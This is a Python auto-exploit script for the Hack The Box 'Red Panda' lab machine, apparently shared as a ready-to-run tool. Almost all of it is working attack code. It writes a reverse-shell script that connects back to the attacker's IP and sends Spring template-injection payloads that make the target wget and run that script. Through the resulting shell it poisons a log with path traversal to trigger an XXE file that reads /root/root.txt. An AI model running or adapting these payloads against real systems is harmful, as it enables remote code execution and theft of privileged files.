from pwn import *
from requests import post,get
from http.server import HTTPServer, SimpleHTTPRequestHandler
import sys


Panda_IP=sys.argv[1]
Your_IP=sys.argv[2]
with open("gecko_creds.xml",'w') as XML_File:
    XML_File.write("""<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/root/root.txt"> ]>
<data>&example;</data>""")
XML_File.close()
with open('shell.sh','w') as Shell:
    Shell.write(f"sh -i >& /dev/tcp/{Your_IP}/1111 0>&1")
Shell.close()
def countdown(t): 
    while t: 
        mins, secs = divmod(t, 60) 
        timer = '{:02d}:{:02d}'.format(mins, secs) 
        print(f"Waiting for cron: {timer} please wait", end="\r") 
        time.sleep(1) 
        t-=1

def Server():
    httpd = HTTPServer(('localhost', 8080), SimpleHTTPRequestHandler)
    httpd.serve_forever()
def Run_Exploit():
    post(f'http://{Panda_IP}:8080/search',data={"name":"*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('wget http://"+Your_IP+":8080/shell.sh').getInputStream())}"})
    post(f"http://{Panda_IP}:8080/search",data={"name":"name=*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('bash shell.sh').getInputStream())"})


def Shell_Listener():
    l = listen(1111)
    svr = l.wait_for_connection()
    svr.recvuntil(b"$")
    warn("Getting Username")
    svr.send(b'whoami\n')
    Username=svr.recvuntil(b'$').decode('utf-8').replace('$','').strip()
    warn("Getting User Flag")
    svr.send(bytes(f'cat /home/{Username}/user.txt\n','utf-8'))
    User_Flag=svr.recvuntil(b'$').decode('utf-8').replace('$','').strip()
    warn("Changing Directories")
    svr.send(bytes(f'cd /tmp\n','utf-8'))
    warn("Downloading photo")
    with open('smooch.jpg','wb') as Smooch_Photo:
        Smooch_Photo.write(get('https://raw.githubusercontent.com/Dr-Gecko/Red-Panda-Auto-Exploit/main/smooch.jpg',stream=True).content)
    Smooch_Photo.close()
    warn("Downloading photo on red panda")
    svr.send(bytes(f'wget http://{Your_IP}:8080/smooch.jpg\n','utf-8'))
    svr.recvuntil(bytes("$",'utf-8'))
    warn("Downloading XML")
    svr.send(bytes(f'wget http://{Your_IP}:8080/gecko_creds.xml\n','utf-8'))
    svr.recvuntil(bytes("$",'utf-8'))
    warn("Changing XML Permissions")
    svr.send(bytes('chmod 777 /tmp/gecko_creds.xml\n','utf-8'))
    svr.recvuntil(bytes("$",'utf-8'))
    warn("Poisoning Logs")
    svr.send(bytes("echo '200||10.10.14.126||Mozilla/5.0 (Windows NT 10.0; rv78.0) Gecko/20100101 Firefox/78.0||/../../../../../../../../tmp/smooch.jpg' > /opt/panda_search/redpanda.log\n",'utf-8'))
    svr.recvuntil(bytes("$",'utf-8'))
    warn("Waiting for log update")
    countdown(120)
    warn("Getting Root Flag")
    svr.send(bytes('cat /tmp/gecko_creds.xml\n','utf-8'))
    Root_Flag=svr.recvuntil(b'</data>').replace(b'<?xml version="1.0" encoding="UTF-8"?>\r\n<!--?xml version="1.0" ?-->\r\n<!DOCTYPE foo>\r\n<data>',b'').replace(b'</data>',b'').replace(b'$',b'').decode('utf-8').strip()
    warn(f"User Flag: {User_Flag}")
    warn(f"Root Flag: {Root_Flag}")
    warn("DrGecko 2024")
if __name__ =="__main__":
    print('HTB Red Panda Auto PWN')
    print('Just wait until completion and will print out flags')
    Server_Thread=threading.Thre(target=Server)
    Shell_Thread=threading.Thread(target=Shell_Listener)
    Exploit_thread = threading.Thread(target=Run_Exploit)
    Server_Thread.start()
    Shell_Thread.start()
    Exploit_thread.start()
    Server_Thread.join()
    Shell_Thread.join()
    Exploit_thread.join()

# Dr Gecko 2024